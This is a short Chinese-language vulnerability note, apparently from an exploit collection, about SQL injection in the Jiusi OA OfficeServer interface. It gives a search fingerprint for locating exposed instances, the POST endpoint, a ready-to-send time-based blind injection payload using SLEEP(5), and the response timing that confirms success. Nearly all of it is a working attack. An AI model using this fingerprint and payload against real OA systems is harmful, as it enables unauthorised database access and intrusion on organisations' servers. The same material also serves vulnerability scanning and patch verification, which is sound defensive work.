# 九思OAofficeserver接口sql注入漏洞

九思OAofficeserver接口 ｜ SQL注入 ｜ —
- **指纹**：`body="/jsoa/login.jsp"`
- **请求**：`POST /jsoa/OfficeServer HTTP/1.1`

**Payload**
```
isAjaxDownloadTemplate=true&fileName='/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT(SLEEP(5)))T)/**/AND/**/'1'='1
```
- **响应特征**：200 响应时间>=5s
Untitled Document